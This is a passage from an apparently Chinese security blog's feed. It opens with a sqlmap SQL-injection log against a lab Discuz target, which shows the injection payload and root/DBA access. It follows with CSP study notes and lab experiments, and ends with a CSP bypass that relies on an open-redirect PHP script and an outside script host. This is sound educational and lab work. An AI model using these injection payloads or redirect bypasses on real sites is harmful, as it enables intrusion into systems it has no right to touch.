class="line"></span><br><span class="line">[*] starting at 10:41:22</span><br><span class="line"></span><br><span class="line">[10:41:22] [INFO] loading tamper script &apos;aes&apos;</span><br><span class="line">[10:41:22] [WARNING] provided value for parameter &apos;id&apos; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</span><br><span class="line">[10:41:22] [INFO] testing connection to the target URL</span><br><span class="line">[10:41:22] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="line">[10:41:22] [INFO] testing if the target URL content is stable</span><br><span class="line">[10:41:23] [INFO] target URL content is stable</span><br><span class="line">[10:41:23] [INFO] testing if GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[10:41:23] [INFO] confirming that GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[10:41:23] [INFO] GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[10:41:23] [WARNING] heuristic (basic) test shows that GET parameter &apos;id&apos; might not be injectable</span><br><span class="line">[10:41:23] [INFO] testing for SQL injection on GET parameter &apos;id&apos;</span><br><span class="line">[10:41:23] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;MySQL &gt;= 5.0 boolean-based blind - Parameter replace&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&apos;</span><br><span class="line">[10:41:25] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos;</span><br><span class="line">[10:41:25] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&apos;</span><br><span class="line">[10:41:25] [INFO] GET parameter &apos;id&apos; is &apos;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&apos; injectable </span><br><span class="line">it looks like the back-end DBMS is &apos;MySQL&apos;. Do you want to skip test payloads specific for other DBMSes? [Y/n] </span><br><span class="line">for the remaining tests, do you want to include all tests for &apos;MySQL&apos; extending provided level (1) and risk (1) values? [Y/n] </span><br><span class="line">[10:41:27] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 20 columns&apos;</span><br><span class="line">[10:41:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">GET parameter &apos;id&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N] </span><br><span class="line">sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: id=(SELECT 3997 FROM(SELECT COUNT(*),CONCAT(0x7170626271,(SELECT (ELT(3997=3997,1))),0x717a717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line">---</span><br><span class="line">[10:41:28] [WARNING] changes made by tampering scripts are not included in shown payload content(s)</span><br><span class="line">[10:41:28] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Nginx</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">[10:41:28] [INFO] fetching current user</span><br><span class="line">[10:41:28] [INFO] retrieved: root@localhost</span><br><span class="line">current user:    &apos;root@localhost&apos;</span><br><span class="line">[10:41:28] [INFO] fetching current database</span><br><span class="line">[10:41:29] [INFO] retrieved: mozhe_Discuz_StormGroup</span><br><span class="line">current database:    &apos;mozhe_Discuz_StormGroup&apos;</span><br><span class="line">[10:41:29] [INFO] testing if current user is DBA</span><br><span class="line">[10:41:29] [INFO] fetching current user</span><br><span class="line">current user is DBA:    True</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[内容安全策略(CSP)学习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-CSP-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="csp基础知识">CSP基础知识</span></h2><h3><span id="简介">简介</span></h3><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。</p>
<h3><span id="开启csp的两种方法">开启CSP的两种方法</span></h3><ul>
<li><p>一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: default-src https:; report-uri /csp-violation-report-endpoint/&quot;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
</blockquote>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
</li>
</ul>
<h3><span id="限制选项">限制选项</span></h3><h4><span id="资源加载限制">资源加载限制</span></h4><ul>
<li><strong>script-src</strong>：外部脚本</li>
<li><strong>style-src</strong>：样式表</li>
<li><strong>img-src</strong>：图像</li>
<li><strong>media-src</strong>：媒体文件（音频和视频）</li>
<li><strong>font-src</strong>：字体文件</li>
<li><strong>object-src</strong>：插件（比如 Flash）</li>
<li><strong>child-src</strong>：框架</li>
<li><strong>frame-ancestors</strong>：嵌入的外部资源（比如frame、iframe、embed和applet）</li>
<li><strong>connect-src</strong>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li><strong>worker-src</strong>：<code>worker</code>脚本</li>
<li><strong>manifest-src</strong>：manifest 文件</li>
</ul>
<h4><span id="default-src">default-src</span></h4><p><code>default-src</code>用来设置上面各个选项的默认值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
<p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p>
<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
<h4><span id="url限制">URL限制</span></h4><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
<blockquote>
<ul>
<li><strong>frame-ancestors</strong>：限制嵌入框架的网页</li>
<li><strong>base-uri</strong>：限制<code>&lt;base#href&gt;</code></li>
<li><strong>form-action</strong>：限制<code>&lt;form#action&gt;</code></li>
</ul>
</blockquote>
<h4><span id="其他限制">其他限制</span></h4><p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
<blockquote>
<ul>
<li><strong>block-all-mixed-content</strong>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li><strong>upgrade-insecure-requests</strong>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li><strong>plugin-types</strong>：限制可以使用的插件格式</li>
<li><strong>sandbox</strong>：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
</blockquote>
<h4><span id="report-uri">report-uri</span></h4><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象。</p>
<h3><span id="选项值">选项值</span></h3><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<blockquote>
<ul>
<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
<li>路径名：<code>example.org/resources/js/</code></li>
<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
<li>协议名：<code>https:</code>、<code>data:</code></li>
<li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li>
<li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li>
</ul>
</blockquote>
<p>多个值也可以并列，用空格分隔。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;self&apos; https://apis.google.com</span><br></pre></td></tr></table></figure>
<p>如果同一个限制选项使用多次，只有第一次会生效。 </p>
<p>如果不设置某个限制选项，就是默认允许任何值。 </p>
<h3><span id="script-src的特殊值">script-src的特殊值</span></h3><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<blockquote>
<ul>
<li><strong>‘unsafe-inline’</strong>：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li>
<li><strong>‘unsafe-eval</strong>‘：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
<li><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li>
<li><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
</ul>
</blockquote>
<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;</span><br></pre></td></tr></table></figure>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">   // some code</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;</span><br></pre></td></tr></table></figure>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>注意，计算hash值的时候，script标签不算在内。</p>
<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
<h3><span id="注意点">注意点</span></h3><p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
<p>（3）必须特别注意 JSONP 的回调函数。 </p>
<h2><span id="csp实验">CSP实验</span></h2><h4><span id="实验1-csp测试">实验1 CSP测试</span></h4><h5><span id="实验代码解析">实验代码解析</span></h5><p>index.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.bootcss.com; child-src https:&quot;&gt;</span><br><span class="line">&lt;script src=&quot;//cdn.bootcss.com/jquery/3.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;/localhost.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.bootcss.com/weui/0.4.0/style/weui.min.css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720180413234055.png&quot; height=&quot;300&quot; width=&quot;300&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;http://app.uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;https://uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>localhost.js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;h1&gt;This is a local js.&lt;/h1&gt;&quot;);</span><br></pre></td></tr></table></figure>
<p>从上面的HTML文件可以看到    ，我们利用<code>meta</code>标签对页面进行开启<code>csp</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.bootcss.com; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任<code>cdn.bootcss.com</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
<p>可以看到我在代码中引入以下内容</p>
<ul>
<li><p>引用外部和当前域的js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;//cdn.bootcss.com/jquery/3.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;/localhost.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>引用外部的样式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.bootcss.com/weui/0.4.0/style/weui.min.css&quot;/&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>HTTPS协议和HTTP协议的frame</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://app.uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;https://uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>其他图片资源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720180413234055.png&quot; height=&quot;300&quot; width=&quot;300&quot;&gt;</span><br></pre></td></tr></table></figure>
<h5><span id="实验运行结果">实验运行结果</span></h5><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp_1.jpg" alt="csp_1"></p>
<p>由实验截图可以看到</p>
</li>
<li><p>外部的资源引用失败，控制台给出了报错信息</p>
</li>
<li>HTTP协议的frame加载失败，控制台给出了报错信息</li>
<li>其他可以加载的img资源和本地的js脚本都加载成功</li>
</ul>
<h4><span id="实验2-report-uri测试">实验2 report-uri测试</span></h4><p>尽管<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to" target="_blank" rel="noopener"><code>report-to</code></a>指令旨在取代已弃用的<code>report-uri</code>指令， <code>report-uri</code>已经从Web标准中删除，但在大多数浏览器中仍不受支持。因此，可以同时指定<code>report-to</code>和<code>report-uri</code>。</p>
<p>在支持的浏览器中<code>report-to</code>，<code>report-uri</code>指令将被忽略。 </p>
<h5><span id="实验代码解析">实验代码解析</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;none&apos;; style-src cdn.example.com; report-uri /csp_report&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.bootcss.com/weui/0.4.0/style/weui.min.css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>在代码中我们利用的策略是限制外部非<code>cdn.example.com</code>域名下的样式表，并把报告发送到<code>/csp_report</code>目录。</p>
<p>我们在代码引用<code>cdn.bootcss.com/weui/0.4.0/style/weui.min.css</code>查看实验结果。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp_2.jpg" alt="csp_2"></p>
<p>由上图可以看到发送出了JSON格式的POST数据。</p>
<h4><span id="实验3-script-src特殊值测试">实验3 script-src特殊值测试</span></h4><h5><span id="unsafe-inline">unsafe-inline</span></h5><p>当<code>script-src</code>设置为<code>unsafe-inline</code>时允许内联脚本和内联事件处理程序。</p>
<p>内联脚本和内联事件处理程序就是在html中利用<code>&lt;script&gt;</code>标签加入的JS代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;unsafe-inline&apos;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;&lt;h1&gt;允许执行页面内嵌的标签和事件监听函数.&lt;/h1&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;/localhost.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>在上面的代码中，我们引入了一个内联的js脚本和一个外置的js脚本，运行代码结果如下。</p>
<p>内联的js脚本是可以执行的，但是外置的js脚本被警报了。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp3.jpg" alt=""></p>
<h5><span id="unsafe-eval">unsafe-eval</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;unsafe-eval&apos; &apos;unsafe-inline&apos;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   eval(&apos;document.write(&quot;&lt;h1&gt;unsafe-eval测试.&lt;/h1&gt;&quot;)&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>这里我们将<code>script-src</code>值设置为<code>unsafe-eval</code>，这里还要开启内置事件的开关<code>unsafe-inline</code>才能执行内置事件。</p>
<p>执行结果是可以看到利用<code>eval</code>函数将字符串当作代码执行了。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp4.jpg" alt=""></p>
<h5><span id="nonce值">nonce值</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">   document.write(&quot;&lt;h1&gt;script nonce 测试.&lt;/h1&gt;&quot;);</span><br><span class="line">   document.write(&quot;&lt;h1&gt;nonce=EDNnf03nceIOfn39fn3e9h3sdfa.&lt;/h1&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>在上诉代码中，<code>header</code>头设置了<code>script-src &#39;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#39;</code>这里的<code>nonce</code>值对相应的</p>
<p><code>script</code>进行判断，如果<code>script</code>的<code>nonce</code>值与之相同，就可以执行相应的Js脚本。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp5.jpg" alt=""></p>
<h3><span id="csp的绕过">CSP的绕过</span></h3><h4><span id="302-bypass-csp">302 Bypass CSP</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(&quot;Content-Security-Policy: script-src http://127.0.0.1/ http://xss.cc/the_only_allow_dir/&quot;);</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     csp header test </span><br><span class="line">    </span><br><span class="line">     &lt;script src=&quot;/test.php?u=//xss.cc/myjs/a.js&quot;&gt;</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>如上代码：</p>
<p>​    CSP允许<code>http://127.0.0.1/</code>和<code>http://xss.cc/the_only_allow_dir/</code>这两个域的<code>script</code></p>
<p>引用。</p>
<p>​    这里的场景需要一个可以302跳转的文件，只要是在域内允许的都可以。这里我们在本地域内创建一个test.php文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: &quot; . $_GET[u]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>​    这样我们就有一个302跳转的文件。</p>
<p>​    在代码中还允许了<a href="http://xss.cc/the_only_allow_dir/%E8%BF%99%E4%B8%AA%E5%9F%9F%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8" target="_blank" rel="noopener">http://xss.cc/the_only_allow_dir/</a> 这个域，然后我们在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.cc/myjs/a.js</span><br></pre></td></tr></table></figure>
<p>​    写入js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&apos;uknow&apos;)</span><br></pre></td></tr></table></figure>
<p>​    这里我们测试就能成功了。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp_5.jpg" alt=""></p>
<h5><span id="csp拦截情况">CSP拦截情况</span></h5><ul>
<li>302跳转页面不在允许域内，比如<code>302.php</code>放在了站的根目录下，允许了<code>http://127.0.0.1/test/</code>这样是会被拦截的。</li>
<li>删除策略中的<code>http://xss.cc/the_only_allow_dir/</code> ,用302跳转到外域即<code>&lt;script src=&quot;/test.php?u=//xss.cc/myjs/a.js&quot;&gt;</code>这样也是会拦截的。</li>
<li>既然外域被允许了，那直接引用外域即<code>&lt;script src=&quot;//xss.cc/myjs/a.js&quot;&gt;</code>这样也是会被拦截的。</li>
</ul>
<h5><span id="总结">总结</span></h5><p>从以上的实验来看这个绕过是需要一定条件的，如下：</p>
<ul>
<li><code>script-uri</code>本地域内需要有一个302跳转页面可以利用，这种页面大多存在于登陆，退出登录。 </li>
<li><code>script-uri</code>的外域内可以构造一个恶意的<code>evil.js</code>。如果外域有一个文件上传漏洞，或者引用的CDN存在一个恶意的<code>evil.js</code>。</li>
</ul>
<h4><span id="link-bypass-unsafe-line">link Bypass unsafe line</span></h4><p>在 HTML5 中的一个新特性：页面资源预加载，他是浏览器提供的一个技巧，目的是让浏览器在空闲时间下载或预读取一些文档资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。 </p>
<p>经测试在<code>chrome</code>和<code>firefox</code>中<code>prefetch</code> 和<code>prerender</code>预加载一个页面这两种方法已经被拦截了。</p>
<p>payload如下：</p>
